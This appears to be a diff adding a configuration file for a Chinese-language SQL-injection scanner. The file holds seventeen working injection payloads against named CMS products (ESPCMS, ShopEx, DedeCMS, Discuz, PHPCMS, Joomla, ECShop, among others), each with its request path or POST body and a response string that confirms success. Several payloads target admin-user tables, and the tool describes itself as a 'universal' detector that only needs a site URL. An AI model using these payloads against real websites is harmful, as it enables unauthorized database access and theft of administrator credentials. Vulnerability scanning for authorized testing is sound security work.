@@ -1,0 +1,146 @@
+<zbz>17</zbz>
+<bz1>
+<name>Espcms SQL注入漏洞
+漏洞位置：/index.php?ac=search&at=taglist&tagkey=a%2527
+存在</name>
+<sfjt>get</sfjt>
+<demo>/index.php?ac=search&at=taglist&tagkey=a%2527</demo>
+<expjc>1</expjc>
+<zjyz></zjyz>
+<xxxz>ESPCMS SQL Error:</xxxz>
+</bz1>
+<bz2>
+<name>shopex登录处sess_id注入</name>
+<sfjt>get</sfjt>
+<demo>/shopadmin/index.php?ctl=passport&act=login&sess_id=1%27%20and%20sleep%283%29--%201</demo>
+<expjc>1</expjc>
+<zjyz></zjyz>
+<xxxz><b>Warning</b>:  INSERT INTO `</xxxz>
+</bz2>
+<bz3>
+<name>DedeCMS recommend.php文件SQL注入</name>
+<sfjt>get</sfjt>
+<demo>/plus/recommend.php?aid=1&_FILES[type][name]&_FILES[type][size]&_FILES[type][type]&_FILES[type][tmp_name]=aa%5c%27and+char(@`%27`)+/*!50000Union*/+/*!50000SeLect*/+1,2,3,md5(0x40776562736166657363616E40),5,6,7,8,9%20from%20`%23@__admin`%23</demo>
+<expjc>1</expjc>
+<zjyz></zjyz>
+<xxxz>2e0e20673083dea5cc87a85d54022049</xxxz>
+</bz3>
+<bz4>
+<name>TOUR旅游网站管理系统SQL注入</name>
+<sfjt>get</sfjt>
+<demo>/line/show.asp?id=926%27%20and%20sleep%283%29--%201</demo>
+<expjc>1</expjc>
+<zjyz></zjyz>
+<xxxz><script language=javascript>alert</xxxz>
+</bz4>
+<bz5>
+<name>Discuz7.2 faq.php文件SQL注入</name>
+<sfjt>get</sfjt>
+<demo>/faq.php?action=grouppermission&gids[99]=%27&gids[100][0]=%29%20and%20%28select%201%20from%20%28select%20count%28*%29,concat%28md5%281%29,floor%28rand%280%29*2%29%29x%20from%20information_schema.tables%20group%20by%20x%29a%29%23</demo>
+<expjc>1</expjc>
+<zjyz></zjyz>
+<xxxz>c4ca4238a0b923820dcc509a6f75849b1</xxxz>
+</bz5>
+<bz6>
+<name>phpcmsv9 authkey泄露 SQL注入</name>
+<sfjt>get</sfjt>
+<demo>/phpsso_server/index.php?m=phpsso&c=index&a=getapplist&auth_data=v=1&appid=1&data=e5c2VAMGUQZRAQkIUQQKVwFUAgICVgAIAldVBQFDDQVcV0MUQGkAQxVZZlMEGA9+DjZoK1AHRmUwBGcOXW5UDgQhJDxaeQVnGAdxVRcKQ</demo>
+<expjc>1</expjc>
+<zjyz></zjyz>
+<xxxz>authkey</xxxz>
+</bz6>
+<bz7>
+<name>PHP168 SQL注入</name>
+<sfjt>get</sfjt>
+<demo>/news/js.php?type=hot&f_id=23)</demo>
+<expjc>1</expjc>
+<zjyz></zjyz>
+<xxxz>SELECT</xxxz>
+</bz7>
+<bz8>
+<name>joomla注入</name>
+<sfjt>get</sfjt>
+<demo>/index.php?option=com_jobprofile&Itemid=61&task=profilesview&id=-1+union+all+select+1,concat_ws(0x3a,0x3a,md5(3.1415),0x3a),3,4,5,6,7,8,9</demo>
+<expjc>1</expjc>
+<zjyz></zjyz>
+<xxxz>63e1f04640e83605c1d177544a5a0488</xxxz>
+</bz8>
+<bz9>
+<name>PHPCMS 2008 flash_upload.php SQL 注入</name>
+<sfjt>get</sfjt>
+<demo>/flash_upload.php?modelid=%30%20%61%6E%64%28%73%65%6C%65%63%74%20%31%20%66%72%6F%6D%28%73%65%6C%65%63%74%20%63%6F%75%6E%74%28%2A%29%2C%63%6F%6E%63%61%74%28%28%73%65%6C%65%63%74%20%28%73%65%6C%65%63%74%20%28%73%65%6C%65%63%74%20%63%6F%6E%63%61%74%28%30%78%37%65%2C%6D%64%35%28%33%2E%31%34%31%35%29%2C%30%78%37%65%29%29%29%20%66%72%6F%6D%20%69%6E%66%6F%72%6D%61%74%69%6F%6E%5F%73%63%68%65%6D%61%2E%74%61%62%6C%65%73%20%6C%69%6D%69%74%20%30%2C%31%29%2C%66%6C%6F%6F%72%28%72%61%6E%64%28%30%29%2A%32%29%29%78%20%66%72%6F%6D%20%69%6E%66%6F%72%6D%61%74%69%6F%6E%5F%73%63%68%65%6D%61%2E%74%61%62%6C%65%73%20%67%72%6F%75%70%20%62%79%20%78%29%61%29</demo>
+<expjc>1</expjc>
+<zjyz></zjyz>
+<xxxz>63e1f04640e83605c1d177544a5a0488</xxxz>
+</bz9>
+<bz10>
+<name>Phpcms 2008 yp/job.php脚本SQL盲注</name>
+<sfjt>get</sfjt>
+<demo>/yp/job.php?action=list&genre=a%2527%2B%61%6E%64%28%73%65%6C%65%63%74%20%31%20%66%72%6F%6D%28%73%65%6C%65%63%74%20%63%6F%75%6E%74%28%2A%29%2C%63%6F%6E%63%61%74%28%28%73%65%6C%65%63%74%20%28%73%65%6C%65%63%74%20%28%73%65%6C%65%63%74%20%63%6F%6E%63%61%74%28%30%78%37%65%2C%6D%64%35%28%33%2E%31%34%31%35%29%2C%30%78%37%65%29%29%29%20%66%72%6F%6D%20%69%6E%66%6F%72%6D%61%74%69%6F%6E%5F%73%63%68%65%6D%61%2E%74%61%62%6C%65%73%20%6C%69%6D%69%74%20%30%2C%31%29%2C%66%6C%6F%6F%72%28%72%61%6E%64%28%30%29%2A%32%29%29%78%20%66%72%6F%6D%20%69%6E%66%6F%72%6D%61%74%69%6F%6E%5F%73%63%68%65%6D%61%2E%74%61%62%6C%65%73%20%67%72%6F%75%70%20%62%79%20%78%29%61%29%23</demo>
+<expjc>1</expjc>
+<zjyz></zjyz>
+<xxxz>63e1f04640e83605c1d177544a5a0488</xxxz>
+</bz10>
+<bz11>
+<name>Eshop user.php?act=signin 注入</name>
+<sfjt>post</sfjt>
+<dzkz>/user.php?act=signin</dzkz>
+<demo>username=%CE%27%20and%201=1%20union%20select%201%20and%20%28select%201%20from%28select%20count%28%2a%29%2Cconcat%28%28Select%20concat%280x5b%2Cmd5%283.1415%29%2C0x5d%29%20FROM%20ecs_admin_user%20limit%200%2C1%29%2Cfloor%28rand%280%29%2a2%29%29x%20from%20information_schema.tables%20group%20by%20x%29a%29%20%23</demo>
+<expjc>1</expjc>
+<zjyz></zjyz>
+<xxxz>63e1f04640e83605c1d177544a5a0488</xxxz>
+</bz11>
+<bz12>
+<name>Shopex addGoodsToCart.html 报错注入</name>
+<sfjt>get</sfjt>
+<demo>/?cart-46-157)and(1)=(updatexml(1,concat(0x23,(select(md5(3.1415))from(sdb_operators)),0x23),1))%23-addGoodsToCart.html</demo>
+<expjc>1</expjc>
+<zjyz></zjyz>
+<xxxz>63e1f04640e83605c1d177544a5a0488</xxxz>
+</bz12>
+<bz13>
+<name>Shopex 1.0 api.php注入</name>
+<sfjt>post</sfjt>
+<dzkz>/api.php?act=search_sub_regions&api_version=1.0</dzkz>
+<demo>p_region_id%3D1%20and%201%3D2%20union%20select%201%2Cconcat%280x23%2Cmd5%283.1415%29%2C0x23%29%2C3%20FROM%20sdb_operators%20limit%200%2C1</demo>
+<expjc>1</expjc>
+<zjyz></zjyz>
+<xxxz>63e1f04640e83605c1d177544a5a0488</xxxz>
+</bz13>
+<bz14>
+<name>Shopex 3.1 api.php注入</name>
+<sfjt>post</sfjt>
+<dzkz>/api.php?act=get_spec_single&api_version=3.1</dzkz>
+<demo>p_region_id%3D1%20and%201%3D2%20union%20select%201%2Cconcat%280x23%2Cmd5%283.1415%29%2C0x23%29%2C3%20FROM%20sdb_operators%20limit%200%2C1</demo>
+<expjc>1</expjc>
+<zjyz></zjyz>
+<xxxz>63e1f04640e83605c1d177544a5a0488</xxxz>
+</bz14>
+<bz15>
+<name>Shopex ?tools-products.html post 注入</name>
+<sfjt>post</sfjt>
+<dzkz>/?tools-products.html</dzkz>
+<demo>goods%3D1%2C2%22%29%20rank%2C%28SELECT%20concat%280x23%2Cmd5%283.1415%29%2C0x23%29%20FROM%20sdb_operators%20limit%200%2C1%29%20as%20goods_id%2Cimage_default%2Cthumbnail_pic%2Cbrief%2Cpdt_desc%2Cmktprice%2Cbig_pic%20FROM%20sdb_goods%20limit%200%2C1%20%23</demo>
+<expjc>1</expjc>
+<zjyz></zjyz>
+<xxxz>63e1f04640e83605c1d177544a5a0488</xxxz>
+</bz15>
+<bz16>
+<name>Discuz问卷调查专业版插件注入</name>
+<sfjt>get</sfjt>
+<demo>/plugin.php?id=nds_up_ques:nds_ques_viewanswer&srchtxt=1&orderby=dateline%20and%201=(updatexml(1,concat(0x27,MD5(1)),1))--</demo>
+<expjc>1</expjc>
+<zjyz></zjyz>
+<xxxz>c4ca4238a0b923820dcc509a6f75849</xxxz>
+</bz16>
+<bz17>
+<name>ecshop 2.7.3 api.php注入</name>
+<sfjt>get</sfjt>
+<demo>/api.php?last_modify_en_time=1&ac=1&counts=1+UNION+ALL+SELECT+NULL%2CCONCAT%280x666630303030%2CIFNULL%28CAST%28CURRENT_USER%28%29AS+CHAR%29%2C0x20%29%2C0x20%29%23&act=search_goods_list&return_data=json&last_modify_st_time=1&pages=1&api_version=1.0</demo>
+<expjc>1</expjc>
+<zjyz></zjyz>
+<xxxz>ff0000</xxxz>
+</bz17>
+<bz>专为CMS通杀的SQL注入漏洞做检测
+
+直接输入 http://网址 即可开始检测</bz>
